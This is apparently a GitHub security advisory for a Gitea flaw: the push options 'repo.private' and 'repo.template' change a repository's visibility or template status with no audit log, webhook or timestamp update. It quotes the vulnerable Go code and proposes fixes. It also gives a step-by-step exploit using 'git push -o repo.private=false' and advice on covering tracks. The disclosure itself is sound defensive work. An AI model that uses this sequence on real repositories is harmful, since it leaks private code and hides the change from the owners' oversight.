# [H] Gitea: Repository Visibility Manipulation via Git Push Options

## Summary
Severity: High
Advisory: GHSA-8p9h-49rc-qgxj
CVE: CVE-2026-58437
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-8p9h-49rc-qgxj
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
### Repository Visibility Manipulation via Git Push Options

| Field | Value |
|-------|-------|
| **Affected File** | `routers/private/hook_post_receive.go` |
| **Affected Function** | `HookPostReceive()` |
| **Affected Lines** | 173–225 |
| **Prerequisite** | Attacker must have owner-level or admin collaborator access to the target repository |

---

#### Description

Gitea's post-receive git hook handler processes git push options — key-value pairs transmitted by a client during `git push` using the `-o` flag. Two undocumented push options, `repo.private` and `repo.template`, allow any user with repository owner or admin-collaborator access to toggle the visibility (`private/public`) and template status of a repository as a side effect of a normal git push.

This capability was originally intended solely for the "push-to-create" feature (automatically creating a repo on first push). However, the options are processed without restriction on already-existing repositories, and — critically — the visibility change bypasses every control that a proper settings change would trigger:

- No entry written to the repository's audit/activity log
- No webhook event fired (`repository` event with `visibility_changed` action)
- No org-level notification to owners
- No team permission re-calculation
- No email alert to watchers
- The database update uses `UpdateRepositoryColsNoAutoTime`, which also suppresses the `updated_at` timestamp change


---

#### Vulnerable Code

**`routers/private/hook_post_receive.go:173–225`**

```go
isPrivate  := opts.GitPushOptions.Bool(private.GitPushOptionRepoPrivate)  // "repo.private"
isTemplate := opts.GitPushOptions.Bool(private.GitPushOptionRepoTemplate) // "repo.template"

if isPrivate.Has() || isTemplate.Has() {
    // ... loads repo and verifies pusher is owner or admin ...
    if !perm.IsOwner() && !perm.IsAdmin() {
        ctx.JSON(http.StatusNotFound, ...)
        return
    }

    // FIXME: these options are not quite right, for example: changing visibility
    //        should do more works than just setting the is_private flag
    // These options should only be used for "push-to-create"
    if isPrivate.Has() && repo.IsPrivate != isPrivate.Value() {
        // TODO: it needs to do more work
        repo.IsPrivate = isPrivate.Value()
        repo_model.UpdateRepositoryColsNoAutoTime(ctx, repo, "is_private")
        //         ^^^ bypasses updated_at timestamp, audit trail suppressed
    }
    if isTemplate.Has() && repo.IsTemplate != isTemplate.Value() {
        repo.IsTemplate = isTemplate.Value()
        repo_model.UpdateRepositoryColsNoAutoTime(ctx, repo, "is_template")
    }
}
```

The push option constants are defined in `modules/private/pushoptions.go:18–19`:

```go
GitPushOptionRepoPrivate  = "repo.private"
GitPushOptionRepoTemplate = "repo.template"
```

---

#### Attack Scenario

**Scenario A — Insider threat / rogue admin collaborator**

An organization grants a contractor repo admin access to contribute to a private repository containing proprietary source code. The contractor, before their access is revoked, makes a private repo public for several minutes — long enough to clone, archive, or index the content — then makes it private again. The action leaves no audit trail distinguishable from a normal git push.

**Scenario B — Supply-chain template poisoning**

A repository marked as a template is used by CI/CD pipelines to generate new project repositories. An admin collaborator uses `repo.template=false` to silently remove the template designation, then makes changes to the repo's content, re-marks it as a template with `repo.template=true`, and waits for downstream consumers to regenerate projects from the now-backdoored template. The `updated_at` timestamp is unchanged due to `UpdateRepositoryColsNoAutoTime`, making diff-detection harder.

---

#### Step-by-Step Reproduction

**Prerequisites:**
- A Gitea user account with either owner or admin-collaborator access to a private repository
- `git` client with push access to the repository

---

**Step 1 — Confirm the target repository is private**

---

**Step 2 — Clone the repository**

```bash
git clone http://USER:PASSWORD@<gitea-host>/OWNER/REPO.git /tmp/target-repo
cd /tmp/target-repo
```

---

**Step 3 — Make any commit** *(the push option rides on a real push)*

```bash
echo "$(date)" >> .gitkeep
git add .gitkeep
git commit -m "routine update"
```

---

**Step 4 — Execute the exploit push**

```bash
# Make the repository public
git push http://USER:PASSWORD@<gitea-host>/OWNER/REPO.git main \
  -o repo.private=false

# The push completes with a normal success message:
#   remote: Processed 1 references in total
#   To http://<gitea-host>/OWNER/REPO.git
#      abc1234..def5678  main -> main
```

---

**Step 5 — Verify the repository is now public**


---

**Step 6 — Restore and cover tracks**

Re-make it private in the same session, leaving no visible audit trail

The repository activity feed shows only two normal push events. The visibility change is invisible.

**Verification: confirm no activity log entry**


---

#### Impact Details

| Impact | Description |
|--------|-------------|
| **Data exfiltration** | Private source code, CI/CD secrets in plain-text files, environment configs become publicly cloneable for the window the repo is public |
| **No audit trail** | `UpdateRepositoryColsNoAutoTime` suppresses the `updated_at` change; no activity log entry; no webhook; no notification |
| **Supply chain** | Combined with `repo.template=true/false`, an attacker can silently rotate repository template status, affecting all downstream repositories that generate from this template |
| **Scope** | Affects all repos where the attacker has admin-collaborator access — not only repos they own |

---

#### Recommended Fix

**Option 1 (preferred) — Remove the options from post-receive hook entirely.** The `repo.private` and `repo.template` push options were designed for the push-to-create flow and have no legitimate use on existing repositories. They should be gated with:

```go
// routers/private/hook_post_receive.go
if isPrivate.Has() || isTemplate.Has() {
    if !wasEmpty {
        // repo already existed — refuse these options on established repos
        log.Warn("Repo push options repo.private/repo.template ignored for existing repo %s", repoName)
        // do not process
    } else {
        // original push-to-create path only
        ...
    }
}
```

**Option 2 — Route through the full visibility-change service** so that audit events, webhooks, and team re-syncs are triggered:

```go
// Instead of the raw UpdateRepositoryColsNoAutoTime call:
if err := repo_service.UpdateRepositoryVisibility(ctx, repo, isPrivate.Value()); err != nil {
    ...
}
```

Where `UpdateRepositoryVisibility` fires the `repository` webhook event and writes an activity log entry.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-8p9h-49rc-qgxj
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
